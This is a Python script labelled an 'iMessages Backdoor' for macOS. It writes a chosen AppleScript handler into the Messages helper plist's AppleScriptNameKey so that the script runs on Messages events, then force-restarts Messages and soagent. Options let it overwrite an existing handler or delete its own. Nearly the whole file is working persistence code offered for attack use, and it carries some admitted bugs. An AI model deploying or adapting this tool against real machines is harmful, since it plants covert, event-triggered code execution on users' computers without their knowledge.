import subprocess
import os
import plistlib as PL
import sys
import argparse
import platform
import time

#Argument Parsing
parser = argparse.ArgumentParser(description='iMessages Backdoor')
parser.add_argument('-handler', type=str, help='The name of the applescript file that will be stored in the iMessages configuration file.')
parser.add_argument('--force', help='Force overwriting of the users current applescript event handler', action='store_true')
parser.add_argument('--delete', help='Delete the current script handler and quit execution.', action='store_true')
parser.add_argument('--verbose', help='Display debugging messages.', action='store_true')
arguments = parser.parse_args()

#Add a kill for the messages application.
#Initial environment information gathering.
templateFile = ""
homedir = os.path.expanduser('~')
path = homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist"
scriptspath = None
currentScript = ""
newScript = arguments.handler

def get_key(path):
    p = subprocess.Popen(["defaults","read",path,'AppleScriptNameKey'],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT)
    return iter(p.stdout.readline, b'')
    
def restart_procs():
    #dostuff
    subprocess.Popen(["killall","Messages"],                         
                             stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT)
    subprocess.Popen(["killall","soagent"],
                             stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT)
    subprocess.Popen(["open","-j","/Applications/Messages.app"],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT)


def failed_exit(step,e):
    print "[!] An error has occured attempting to " + step
    print str(e)
    exit()

def write_key(newHandler, path):
    print "[+] Writing new AppleScript event handler to " + path
    subprocess.Popen(["defaults","write",path,'AppleScriptNameKey',"-string", newHandler],
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT) 
                        
    print "[+] Write key successful"

def check_if_exists(path): 
    if os.path.isfile(path):
        return True
    else:
        return False
def create_soagent_file():
    print "Does this even matter?"
    #Todo: Create a file and maybe have it activate a user.
 
 
def delete_key(oldScript, path):
    print "[+] Deleting the old key from the com.apple.messageshelper.AlertsController.plist file:"
    subprocess.Popen(["defaults","delete",path,'AppleScriptNameKey'],
                          stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT)


#Check version of OSX we're running
#~/Library/Application Scripts/Com.apple.iChat for any macs newer than 10.7
#~/Library/Scripts/Messages for any macs 10.7 and older.


#Sanity Checks:
if newScript is None and arguments.delete==False:
    print "[!] No AppleScript handler set! Exiting."
    exit()
if arguments.delete==True and arguments.force==True:
    print "[!] Please don't set both Force and Delete, only select one! Exiting."
    exit()

macversion = platform.mac_ver()[0].split(".")
print "[INFO] Running Mac OSX " + macversion[0] + "." + macversion[1] + "." + macversion[2]
if int(macversion[0]) == 10 and int(macversion[1]) <= 7:
    scriptspath = homedir + "/Library/Scripts/Messages/"
    print "[INFO] Using scripts path: " + scriptspath
#elif int(macversion[0]) == 10 and int(macversion[1]) >= 7:
else:
    scriptspath = homedir + "/Library/Application Scripts/Com.apple.iChat/"
    print "[INFO] Using scripts path: " + scriptspath 
                          
#Check if the plist file exists so that we can write to it.

if check_if_exists(path):
    print "[+] Plist file found! Using file: " + path
else:
    print "[!] File Not Founfd, time to bail."
    failed_exit("check if the plist file exists, the file: " + path + " was not found!")

#Check to see if there's a value already written to the plist file.
for line in get_key(path):
    currentScript += line

#If the delete flag is set, check to see if it exists already, if not exit, if it does then delete it and exit.
if arguments.delete==True:
    try:
        if "does not exist" in currentScript:
            failed_exit("deleting the key, no key is currently set!","")
        else:
            delete_key(currentScript, path)
            restart_procs()
            exit()
    except Exception, e:
        failed_exit("delete the old key from the plist",e)

if "does not exist" in currentScript:
    print "[+] No current applescript handlers set."
    try:
        write_key(newScript, path)
    except Exception, e:
        failed_exit("write new script into the plist.",e)
else:
    print "Current Handler Found: " + currentScript
    if arguments.force==True: #Bug here, if the key gets deleted, it never gets re-written.
        try:
            delete_key(currentScript, path)
        except Exception, e:
            failed_exit("delete the old key from the plist",e)
        restart_procs()
        try:
            write_key(newScript, path)
        except Exception, e:
            failed_exit("write new script into the plist.",e)
    else:
        failed_exit("write new script into the plist, a handler already exists. To overwrite the current handler and continue, use the --force flag.","")
restart_procs()
exit()
